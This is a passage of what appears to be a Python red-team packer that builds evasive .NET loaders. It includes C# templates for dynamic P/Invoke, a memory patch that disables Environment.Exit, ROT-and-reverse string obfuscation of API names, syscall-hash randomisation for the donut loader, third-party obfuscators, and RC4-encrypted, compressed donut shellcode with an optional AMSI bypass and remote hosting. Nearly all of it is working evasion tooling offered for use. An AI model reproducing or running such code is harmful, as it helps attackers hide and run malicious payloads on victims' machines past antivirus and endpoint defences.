            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_RECORD
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr ExceptionRecord;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)] public uint[] ExceptionInformation;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_POINTERS
        {
            public IntPtr pExceptionRecord;
            public IntPtr pContextRecord;
        }
    }

<CLASS_DPINVOKE>

<DPINVOKE_LOADLIBRARY>

<DPINVOKE_GETPROCADDRESS>

<DPINVOKE_VIRTUALQUERY>

<DPINVOKE_VIRTUALPROTECT>

        public static IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler)
        {
            Type[] parameterTypes = { typeof(uint), typeof(IntPtr) };
            object[] parameters = { First, Handler };
            var result = (IntPtr)DynamicPInvokeBuilder(typeof(IntPtr), Program.RotAndReverse(<KERNEL32.DLL_006>), Program.RotAndReverse(<ADDVECTOREDEXCEPTIONHANDLER_001>), parameters, parameterTypes);
            return result;
        }

        public static bool GetThreadContext(IntPtr hThread, IntPtr lpContext)
        {
            Type[] parameterTypes = { typeof(IntPtr), typeof(IntPtr) };
            object[] parameters = { hThread, lpContext };
            var result = (bool)DynamicPInvokeBuilder(typeof(bool), Program.RotAndReverse(<KERNEL32.DLL_004>), Program.RotAndReverse(<GETTHREADCONTEXT_001>), parameters, parameterTypes);
            return result;
        }

        public static bool SetThreadContext(IntPtr hThread, IntPtr lpContext)
        {
            Type[] parameterTypes = { typeof(IntPtr), typeof(IntPtr) };
            object[] parameters = { hThread, lpContext };
            var result = (bool)DynamicPInvokeBuilder(typeof(bool), Program.RotAndReverse(<KERNEL32.DLL_005>), Program.RotAndReverse(<SETTHREADCONTEXT_001>), parameters, parameterTypes);
            return result;
        }
    }

<CLASS_MBI>
}
'''

PATCH_ENVIRONMENT_EXIT = '''\
        /// <summary>
        /// Based on: https://www.mdsec.co.uk/2020/08/massaging-your-clr-preventing-environment-exit-in-in-process-net-assemblies/
        /// </summary>
        static void PatchEnvironmentExit()
        {
            var methods = new List<MethodInfo>(typeof(Environment).GetMethods(BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic));
            var exitMethod = methods.Find((MethodInfo mi) => mi.Name == Program.RotAndReverse(<EXIT_001>));

            RuntimeHelpers.PrepareMethod(exitMethod.MethodHandle);

            unsafe
            {
                var exitMethodPtr = exitMethod.MethodHandle.GetFunctionPointer();

                _ = DPInvoke.VirtualQuery(exitMethodPtr, out MBI.MEMORY_BASIC_INFORMATION mbi, (uint)Marshal.SizeOf(typeof(MBI.MEMORY_BASIC_INFORMATION)));
                _ = DPInvoke.VirtualProtect((IntPtr)exitMethodPtr, (UIntPtr)1, (uint)MBI.AllocationProtectEnum.PAGE_EXECUTE_READWRITE, out uint flOldProtect);

                *(byte*)exitMethodPtr = 0xc3; // ret

                _ = DPInvoke.VirtualProtect((IntPtr)exitMethodPtr, (UIntPtr)1, flOldProtect, out flOldProtect);
            }
        }'''

CLASS_MBI = '''\
    class MBI
    {
        public struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public AllocationProtectEnum AllocationProtect;
            public IntPtr RegionSize;
            public StateEnum State;
            public AllocationProtectEnum Protect;
            public TypeEnum Type;
        }

        public enum AllocationProtectEnum : uint
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }

        public enum StateEnum : uint
        {
            MEM_COMMIT = 0x1000,
            MEM_FREE = 0x10000,
            MEM_RESERVE = 0x2000
        }

        public enum TypeEnum : uint
        {
            MEM_IMAGE = 0x1000000,
            MEM_MAPPED = 0x40000,
            MEM_PRIVATE = 0x20000
        }
    }'''

CLASS_DPINVOKE = '''\
    /// <summary>
    /// Based on: https://bohops.com/2022/04/02/unmanaged-code-execution-with-net-dynamic-pinvoke/
    /// </summary>
    class DPInvoke
    {
        static object DynamicPInvokeBuilder(Type type, string library, string method, object[] parameters, Type[] parameterTypes)
        {
            AssemblyName assemblyName = new AssemblyName(<ASSEMBLYNAME>);
            AssemblyBuilder assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
            ModuleBuilder moduleBuilder = assemblyBuilder.DefineDynamicModule(<DEFINEDYNAMICMODULE>);

            MethodBuilder methodBuilder = moduleBuilder.DefinePInvokeMethod(
                method,
                library,
                MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl,
                CallingConventions.Standard,
                type,
                parameterTypes,
                CallingConvention.Winapi,
                CharSet.Ansi);

            methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
            moduleBuilder.CreateGlobalFunctions();

            MethodInfo dynamicMethod = moduleBuilder.GetMethod(method);
            object result = dynamicMethod.Invoke(null, parameters);

            return result;
        }'''

DPINVOKE_LOADLIBRARY = '''\
        public static IntPtr LoadLibrary(string lpModuleName)
        {
            Type[] parameterTypes = { typeof(string) };
            object[] parameters = { lpModuleName };
            var result = (IntPtr)DynamicPInvokeBuilder(typeof(IntPtr), Program.RotAndReverse(<KERNEL32.DLL_001>), Program.RotAndReverse(<LOADLIBRARY_001>), parameters, parameterTypes);
            return result;
        }'''

DPINVOKE_GETPROCADDRESS = '''\
        public static IntPtr GetProcAddress(IntPtr hModule, string procName)
        {
            Type[] parameterTypes = { typeof(IntPtr), typeof(string) };
            object[] parameters = { hModule, procName };
            var result = (IntPtr)DynamicPInvokeBuilder(typeof(IntPtr), Program.RotAndReverse(<KERNEL32.DLL_002>), Program.RotAndReverse(<GETPROCADDRESS_001>), parameters, parameterTypes);
            return result;
        }'''

DPINVOKE_VIRTUALQUERY = '''\
        public static int VirtualQuery(IntPtr lpAddress, out MBI.MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength)
        {
            var mbi = new MBI.MEMORY_BASIC_INFORMATION();

            Type[] parameterTypes = { typeof(IntPtr), typeof(MBI.MEMORY_BASIC_INFORMATION).MakeByRefType(), typeof(uint) };
            object[] parameters = { lpAddress, mbi, dwLength };
            var result = (int)DynamicPInvokeBuilder(typeof(int), Program.RotAndReverse(<KERNEL32.DLL_007>), Program.RotAndReverse(<VIRTUALQUERY_001>), parameters, parameterTypes);

            if (result == 0) throw new Win32Exception(Marshal.GetLastWin32Error());
            lpBuffer = (MBI.MEMORY_BASIC_INFORMATION)parameters[1];

            return result;
        }'''

DPINVOKE_VIRTUALPROTECT = '''\
        public static bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)
        {
            uint oldProtect = 0;

            Type[] parameterTypes = { typeof(IntPtr), typeof(UIntPtr), typeof(uint), typeof(uint).MakeByRefType() };
            object[] parameters = { lpAddress, dwSize, flNewProtect, oldProtect };
            var result = (bool)DynamicPInvokeBuilder(typeof(bool), Program.RotAndReverse(<KERNEL32.DLL_003>), Program.RotAndReverse(<VIRTUALPROTECT_001>), parameters, parameterTypes);

            if (!result) throw new Win32Exception(Marshal.GetLastWin32Error());
            lpflOldProtect = (uint)parameters[3];

            return result;
        }'''

ROT_AND_REVERSE = '''\
        public static string RotAndReverse(string text, int shift = 10)
        {
            StringBuilder result = new StringBuilder();

            for (int i = 0; i < text.Length; i++)
            {
                char c = text[i];
                if (char.IsLetter(c))
                {
                    int align = 97;
                    if (char.IsUpper(c))
                        align = 65;

                    int t = (c - shift - align) % 26;
                    if (t < 0) t += 26;

                    result.Append((char)(t + align));
                }
                else
                    result.Append(c);
            }
            return new string(result.ToString().Reverse().ToArray());
        }'''


class RC4:
    """Stolen from: https://gist.github.com/hsauers5/491f9dde975f1eaa97103427eda50071"""

    def __init__(self, key: bytes) -> None:
        sched = self.key_scheduling(key)
        self.key_stream = self.stream_generation(sched)

    def key_scheduling(self, key: bytes) -> list[int]:
        sched = [i for i in range(0, 256)]

        i = 0
        for j in range(0, 256):
            i = (i + sched[j] + key[j % len(key)]) % 256
            tmp = sched[j]
            sched[j] = sched[i]
            sched[i] = tmp

        return sched

    def stream_generation(self, sched: list[int]) -> Iterator[bytes]:
        i, j = 0, 0
        while True:
            i = (1 + i) % 256
            j = (sched[i] + j) % 256
            tmp = sched[j]
            sched[j] = sched[i]
            sched[i] = tmp
            yield sched[(sched[i] + sched[j]) % 256]        

    def encrypt(self, plaintext: bytes) -> bytes:
        return bytearray(char ^ next(self.key_stream) for char in plaintext)


class RehashSyscalls:
    """Adopted from: https://github.com/helpsystems/nanodump/blob/main/scripts/randomize_sw2_seed.py"""

    def __init__(self, donut_dir: str, seed: int = None, silent: bool = False) -> None:
        self.loader_path = Path(donut_dir) / 'loader'

        if seed is None:
            self.new_seed = randint(2 ** 28, 2 ** 32 - 1)
        else:
            self.new_seed = seed

        self.silent = silent

        self.old_seed = None
        self.get_old_seed()
        self.replace_seed()
        self.replace_syscall_hashes()

    def get_old_seed(self) -> None:
        with open(self.loader_path / 'syscalls.h') as f:
            code = f.read()

        match = re.search(r'#define SW2_SEED (0x[a-fA-F0-9]{8})', code)
        assert match is not None, 'SW2_SEED not found!'

        self.old_seed = match.group(1)

    def replace_seed(self) -> None:
        with open(self.loader_path / 'syscalls.h') as f:
            code = f.read()

        code = code.replace(
            f'#define SW2_SEED {self.old_seed}',
            f'#define SW2_SEED 0x{self.new_seed:08X}',
            1
        )

        with open(self.loader_path / 'syscalls.h', 'w') as f:
            f.write(code)

    def get_function_hash(self, function_name) -> None:
        function_hash = self.new_seed

        if function_name[:2] == 'Nt':
            function_name = 'Zw' + function_name[2:]

        name = function_name + '\0'
        ror8 = lambda v: ((v >> 8) & (2 ** 32 - 1)) | ((v << 24) & (2 ** 32 - 1))

        for segment in [s for s in [name[i:i + 2] for i in range(len(name))] if len(s) == 2]:
            partial_name_short = struct.unpack('<H', segment.encode())[0]
            function_hash ^= partial_name_short + ror8(function_hash)

        return function_hash

    def replace_syscall_hashes(self) -> None:
        if not self.silent:
            print(f'# {self.loader_path / "syscalls.c"}\n')

        with open(self.loader_path / 'syscalls.c') as f:
            code = f.read()

        regex = re.compile(r'__declspec\(naked\) NTSTATUS (Nt[^(]+)')
        syscall_names = re.findall(regex, code)

        syscall_names = set(syscall_names)
        syscall_definitions = code.split('#elif defined(__GNUC__)')[1]

        for syscall_name in syscall_names:
            regex = re.compile('NTSTATUS ' + syscall_name + '.*?mov ecx, (0x[A-Fa-f0-9]{8})', re.DOTALL)
            match = re.search(regex, syscall_definitions)
            assert match is not None, f'hash of syscall {syscall_name} not found!'

            old_hash = match.group(1)
            new_hash = self.get_function_hash(syscall_name)

            if not self.silent:
                print(f'{syscall_name} -> {old_hash} -> 0x{new_hash:08X}')

            code = code.replace(
                old_hash,
                f'0x{new_hash:08X}'
            )

        with open(self.loader_path / 'syscalls.c', 'w') as f:
            f.write(code)

        if not self.silent:
            print(f'\n# {self.loader_path / "syscalls-asm.asm"}\n')

        with open(self.loader_path / 'syscalls-asm.asm') as f:
            code = f.read()

        for syscall_name in syscall_names:
            regex = re.compile(syscall_name + ' PROC.*?mov ecx, 0([A-Fa-f0-9]{8})h', re.DOTALL)
            match = re.search(regex, code)
            assert match is not None, f'hash of syscall {syscall_name} not found!'

            old_hash = match.group(1)
            new_hash = self.get_function_hash(syscall_name)

            if not self.silent:
                print(f'{syscall_name} -> 0{old_hash}h -> 0{new_hash:08X}h')

            code = code.replace(
                f'0{old_hash}h',
                f'0{new_hash:08X}h',
                1
            )

        with open(self.loader_path / 'syscalls-asm.asm', 'w') as f:
            f.write(code)

        if not self.silent:
            print('\ndone!')


def is_unix() -> bool:
    return platform.system() == 'Linux'


def is_windows() -> bool:
    return platform.system() == 'Windows'


def gen_random_string(length: int = 10) -> str:
    return ''.join(sample(string.ascii_letters, int(length)))


def info(message: str):
    print(f'{colored("[*]", "white", attrs=["bold"])} {colored(message, "cyan")}')


def success(message: str):
    print(f'{colored("[+]", "white", attrs=["bold"])} {colored(message, "green")}')


def warning(message: str):
    print(f'{colored("[!]", "white", attrs=["bold"])} {colored(message, "yellow")}')


def error(message: str):
    print(f'{colored("[-]", "white", attrs=["bold"])} {colored(message, "red")}')


def debug(message: str):
    print(colored(message, 242))


# https://gist.github.com/garrettdreyfus/8153571?permalink_comment_id=4301565#gistcomment-4301565
def confirm(question: str, default_no: bool=False) -> bool:
    choices = '    (y/N): ' if default_no else '    (Y/n): '
    default_answer = 'n' if default_no else 'y'

    print(f'{colored("[>]", "white", attrs=["bold"])} {colored(question, "magenta")}')

    reply = None
    while reply not in ('y', 'n'):
        reply = str(input(choices)).lower().strip() or default_answer

    return reply == 'y'


def reverse_and_rot(text: str, shift: int=10) -> str:
    result = ''
    for i in range(len(text)-1, -1, -1):
        c = text[i]
        if c.isalpha():
            if c.isupper():
                result += chr((ord(c) + shift - 65) % 26 + 65)
            else:
                result += chr((ord(c) + shift - 97) % 26 + 97)
        else:
            result += c

    return result


def run_command(command: str) -> str:
    process = subprocess.Popen(shlex.split(command), stdout=subprocess.PIPE)

    result = ''
    while True:
        output = process.stdout.readline().decode()
        if output == '' and process.poll() is not None:
            break
        if output:
            result += output

    #result = process.poll()
    if result:
        print(result.strip())

    return result


def main(args) -> None:
    payload_string = args.payload_string
    payload_path = Path(payload_string.split()[0])
    payload_path_name, payload_path_stem = payload_path.name, payload_path.stem

    if is_unix():
        to_null = ' >/dev/null 2>&1'
    else:  # is_windows()
        to_null = ' >nul 2>&1'

    if not payload_path.exists():
        info(f'Executable "{payload_path}" not found, trying to download it from the SharpCollection')
        try:
            repo = Github().get_repo('Flangvik/SharpCollection')
            contents = repo.get_contents('')

            while len(contents) > 1:
                item = contents.pop(0)
                if item.type == 'dir' and 'x86' not in item.path:
                    contents.extend(repo.get_contents(item.path))
                elif item.path.endswith(payload_path_name):
                    payload_path_temp = Path(tempfile.gettempdir()) / payload_path_name
                    days = (datetime.now() - repo.get_commits(path=item.path)[0].commit.author.date).days
                    info(f'Writing {item.html_url} to "{payload_path_temp}" [{days} days ago]')

                    content = repo.get_contents(urllib.parse.quote(item.path)).content
                    content = base64.b64decode(content)
                    with open(payload_path_temp, 'wb') as f:
                        f.write(content)

                    payload_path = payload_path_temp
                    break
            else:
                raise Exception('Failed to download the executable either, aborting')
        except Exception as e:
            error(e)
            return

    if args.donut:
        donut_path = os.environ.get('DONUT')
        if donut_path is not None:
            donut_path = Path(donut_path)
        else:
            donut_path = which('donut')
            if donut_path is not None:
                donut_path = Path(donut_path)

        if donut_path is None or not donut_path.resolve().exists():
            error('Donut not found!')
            if is_unix():
                global INSTALL_DONUT_LINUX
                warning('Install with:')
                print(INSTALL_DONUT_LINUX)
            elif is_windows():
                global INSTALL_DONUT_WINDOWS
                warning('Install with:')
                print(INSTALL_DONUT_WINDOWS)
            else:
                error('Unknown platform!')
            return

    if args.donut or args.patchless_amsi:
        if is_unix():
            compiler = 'mono-csc'
            if not which(compiler):
                error('Mono not found!')
                warning('Install with:')
                print('\nsudo apt install mono-devel\n')
                return
        elif is_windows():
            compiler = 'csc'
            if not which(compiler):
                error('csc not found!')
                warning('Rerun from:')
                print('\nx64 Native Tools Command Prompt for VS\n')
                return
        else:
            error('Unknown platform!')
            return

    if args.obfuscator:
        absolute_path = Path(__file__)
        try:
            absolute_path = absolute_path.readlink()
        except OSError:
            pass

        obfuscator_path = absolute_path.parent / '3rd-party' / args.obfuscator / f'{args.obfuscator}'
        if args.obfuscator == 'yetAnotherObfuscator' or args.obfuscator == 'NixImports' and is_windows():
            obfuscator_path = Path(str(obfuscator_path) + '.exe')
        elif args.obfuscator == 'NixImports' and is_unix():
            obfuscator_path = Path(str(obfuscator_path) + '.dll')

        if not obfuscator_path.exists():
            error(f'{args.obfuscator} not found!')
            if is_unix():
                global INSTALL_OBFUSCATORS_LINUX
                warning('Install with:')
                print(INSTALL_OBFUSCATORS_LINUX)
            elif is_windows():
                global INSTALL_OBFUSCATORS_WINDOWS
                warning('Install with:')
                print(INSTALL_OBFUSCATORS_WINDOWS)
            else:
                error('Unknown platform!')
            return

    if args.obfuscator == 'yetAnotherObfuscator':
        if is_unix():
            obfuscate_cmd = f"""printf '%s' "$(winepath -w {payload_path})" | wine "{obfuscator_path}" """
        else:  # is_windows()
            obfuscate_cmd = f'echo {payload_path} | "{obfuscator_path}"'
        if args.silent: obfuscate_cmd += to_null
        info(obfuscate_cmd)
        os.system(obfuscate_cmd)

        if args.donut and not args.debug:
            os.remove(payload_path)

        new_payload_path = Path(str(payload_path) + '._obf.exe')

        if args.debug:
            debug(f'{payload_path.resolve()} '
                  f'-> {new_payload_path.resolve()}')

        payload_path = new_payload_path
    elif args.obfuscator == 'NixImports':
        if is_unix():
            obfuscate_cmd = f'dotnet {obfuscator_path} {payload_path}'
        else:  # is_windows()
            obfuscate_cmd = f'{obfuscator_path} {payload_path}'
        if args.silent: obfuscate_cmd += to_null
        info(obfuscate_cmd)
        os.system(obfuscate_cmd)

        if args.donut and not args.debug:
            os.remove(payload_path)

        new_payload_path = Path(move(
            str(obfuscator_path.parent / 'Loader.exe'),
            str(payload_path.resolve()) + '._obf.exe'
        ))

        if args.debug:
            debug(f'{payload_path.resolve()} '
                  f'-> {(obfuscator_path.parent / "Loader.exe").resolve()} '
                  f'-> {new_payload_path.resolve()}')

        payload_path = new_payload_path

    if args.donut:
        if is_unix() or is_windows() and args.syswhispers3:
            if (args.rehash and args.rehash.lower() in ['y', 'yes'] and args.rehash.lower() not in ['n', 'no']) or \
               (args.rehash is None and \
                confirm(f'Psst, hey buddy... Wanna rehash syscalls like @{"s4ntiago_p" if is_unix() else "KlezVirus"} taught us?')):

                try:
                    donut_path = donut_path.readlink()
                except OSError:
                    pass

                try:  # is_windows() and symlink
                    donut_dir = os.path.dirname(str(donut_path).split('?')[-1].strip('\\'))
                except:
                    donut_dir = donut_path.parent

                if is_unix():
                    _ = RehashSyscalls(donut_dir, silent=args.silent)
                else:  # is_windows()
                    syscalls_path = Path(donut_dir) / 'loader' / 'syscalls'
                    syswhispers3_cmd = f'py {args.syswhispers3} -a all -m {args.syswhispers3_method} -o {syscalls_path} --donut'
                    if args.silent: syswhispers3_cmd += to_null
                    info(syswhispers3_cmd)
                    os.system(syswhispers3_cmd)

                if is_unix():
                    donut_compile_cmd = 'make'
                else:  # is_windows()
                    donut_compile_cmd = 'nmake -f Makefile64.msvc'

                if args.silent: donut_compile_cmd += to_null
                info(donut_compile_cmd)
                popd = os.getcwd()
                os.chdir(donut_dir)
                os.system(donut_compile_cmd)
                os.chdir(popd)

        payload_args = ' '.join(payload_string.split()[1:])
        donut_shellcode_path = Path(tempfile.gettempdir()) / f'{gen_random_string(6)}.bin'
        donut_cmd = f'{donut_path} -i {payload_path} -x2 -p "{payload_args}" -o {donut_shellcode_path}'
        if args.decoy:
            donut_cmd += f' -j "{args.decoy}"'
        if args.no_amsi and is_unix() or is_windows():
            donut_cmd += ' -b1'  # donut's builtin amsi bypass fails when compiled from @KlezVirus version
        if args.server:
            if args.username and args.password:
                proto, lhost = args.server.split('://')
                server = f'{proto}://{args.username}:{args.password}@{lhost}'
            else:
                server = args.server
            if not server.endswith('/'):
                server += '/'
            if args.module:
                donut_cmd += f' -n {args.module}'
            donut_cmd += f' -s {server}'
        if args.silent: donut_cmd += to_null
        info(donut_cmd)
        if args.server:
            result = run_command(donut_cmd)
            module = re.search(r'Module name\s+: (.*)', result).group(1)
        else:
            os.system(donut_cmd)
            module = ''

        with open(donut_shellcode_path, 'rb') as f:
            donut_shellcode = f.read()

        if not args.no_rc4:
            key = gen_random_string(16).encode()
            ctx = RC4(key)
            info('Encrypting the payload with RC4 (SystemFunction032)')
            donut_shellcode = ctx.encrypt(donut_shellcode)

        deflate_stream = zlib.compressobj(zlib.Z_DEFAULT_COMPRESSION, zlib.DEFLATED, -15)
        donut_shellcode_compressed = deflate_stream.compress(donut_shellcode)
        donut_shellcode_compressed += deflate_stream.flush()

        donut_shellcode_compressed_b64 = base64.b64encode(donut_shellcode_compressed).decode()

        if not args.debug:
            os.remove(donut_shellcode_path)

        namespace = 'AssemblyApp'

        global TEMPLATE
        TEMPLATE = TEMPLATE.replace('<NAMESPACE>', namespace)
        TEMPLATE = TEMPLATE.replace('<DONUT>', f'"{donut_shellcode_compressed_b64}"')
        TEMPLATE = TEMPLATE.replace('<ROT_AND_REVERSE>', ROT_AND_REVERSE)

        TEMPLATE = TEMPLATE.replace('<CLASS_DPINVOKE>', CLASS_DPINVOKE)
        TEMPLATE = TEMPLATE.replace('<ASSEMBLYNAME>', f'"{gen_random_string(6)}"')
        TEMPLATE = TEMPLATE.replace('<DEFINEDYNAMICMODULE>', f'"{gen_random_string(6)}"')
        TEMPLATE = TEMPLATE.replace('<DPINVOKE_LOADLIBRARY>', DPINVOKE_LOADLIBRARY)
        TEMPLATE = TEMPLATE.replace('<DPINVOKE_GETPROCADDRESS>', DPINVOKE_GETPROCADDRESS)
        TEMPLATE = TEMPLATE.replace('<DPINVOKE_VIRTUALPROTECT>', DPINVOKE_VIRTUALPROTECT)

        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<KERNEL32.DLL_001>', f'''"{reverse_and_rot('kernel32.dll', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<KERNEL32.DLL_002>', f'''"{reverse_and_rot('kernel32.dll', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<KERNEL32.DLL_003>', f'''"{reverse_and_rot('kernel32.dll', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<KERNEL32.DLL_004>', f'''"{reverse_and_rot('kernel32.dll', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<KERNEL32.DLL_005>', f'''"{reverse_and_rot('kernel32.dll', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<KERNEL32.DLL_006>', f'''"{reverse_and_rot('kernel32.dll', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<KERNEL32.DLL_007>', f'''"{reverse_and_rot('kernel32.dll', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<KERNEL32.DLL_008>', f'''"{reverse_and_rot('kernel32.dll', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<KERNEL32.DLL_009>', f'''"{reverse_and_rot('kernel32.dll', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<KERNEL32.DLL_010>', f'''"{reverse_and_rot('kernel32.dll', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<KERNEL32.DLL_011>', f'''"{reverse_and_rot('kernel32.dll', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<KERNEL32.DLL_012>', f'''"{reverse_and_rot('kernel32.dll', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<KERNEL32.DLL_013>', f'''"{reverse_and_rot('kernel32.dll', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<KERNEL32.DLL_014>', f'''"{reverse_and_rot('kernel32.dll', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<GETMODULEHANDLE_001>', f'''"{reverse_and_rot('GetModuleHandle', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<LOADLIBRARY_001>', f'''"{reverse_and_rot('LoadLibrary', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<GETPROCADDRESS_001>', f'''"{reverse_and_rot('GetProcAddress', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<VIRTUALPROTECT_001>', f'''"{reverse_and_rot('VirtualProtect', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<VIRTUALPROTECT_002>', f'''"{reverse_and_rot('VirtualProtect', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<CREATETHREAD_001>', f'''"{reverse_and_rot('CreateThread', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<CREATETHREAD_002>', f'''"{reverse_and_rot('CreateThread', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<WAITFORSINGLEOBJECT_001>', f'''"{reverse_and_rot('WaitForSingleObject', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<WAITFORSINGLEOBJECT_002>', f'''"{reverse_and_rot('WaitForSingleObject', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<GETSTDHANDLE_001>', f'''"{reverse_and_rot('GetStdHandle', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<SETSTDHANDLE_001>', f'''"{reverse_and_rot('SetStdHandle', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<READFILE_001>', f'''"{reverse_and_rot('ReadFile', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<CREATEPIPE_001>', f'''"{reverse_and_rot('CreatePipe', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<CLOSEHANDLE_001>', f'''"{reverse_and_rot('CloseHandle', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<KERNELBASE_001>', f'''"{reverse_and_rot('kernelbase', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<KERNELBASE_002>', f'''"{reverse_and_rot('kernelbase', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<KERNELBASE_003>', f'''"{reverse_and_rot('kernelbase', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<EXITTHREAD_001>', f'''"{reverse_and_rot('ExitThread', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<TERMINATEPROCESS_001>', f'''"{reverse_and_rot('TerminateProcess', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<TERMINATEPROCESS_002>', f'''"{reverse_and_rot('TerminateProcess', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<MSCOREE_001>', f'''"{reverse_and_rot('mscoree', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<MSCOREE_002>', f'''"{reverse_and_rot('mscoree', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<COREXITPROCESS_001>', f'''"{reverse_and_rot('CorExitProcess', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<COREXITPROCESS_002>', f'''"{reverse_and_rot('CorExitProcess', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<NTDLL_001>', f'''"{reverse_and_rot('ntdll', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<NTDLL_002>', f'''"{reverse_and_rot('ntdll', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<NTDLL_003>', f'''"{reverse_and_rot('ntdll', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<NTDLL_004>', f'''"{reverse_and_rot('ntdll', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<NTTERMINATEPROCESS_001>', f'''"{reverse_and_rot('NtTerminateProcess', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<NTTERMINATEPROCESS_002>', f'''"{reverse_and_rot('NtTerminateProcess', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<RTLEXITUSERPROCESS_001>', f'''"{reverse_and_rot('RtlExitUserProcess', s)}", {s}''')
        s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<RTLEXITUSERPROCESS_002>', f'''"{reverse_and_rot('RtlExitUserProcess', s)}", {s}''')

        if is_unix() or is_windows() and args.no_amsi:
            TEMPLATE = TEMPLATE.replace('<AMSI_BYPASS>\n\n', '')
            TEMPLATE = TEMPLATE.replace('<AMSI_BYPASS_APPLY>\n\n', '')
        else:
            TEMPLATE = TEMPLATE.replace('<AMSI_BYPASS>', AMSI_BYPASS)
            TEMPLATE = TEMPLATE.replace('<AMSI_BYPASS_APPLY>', AMSI_BYPASS_APPLY)
            s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<AMSI.DLL_001>', f'''"{reverse_and_rot('amsi.dll', s)}", {s}''')
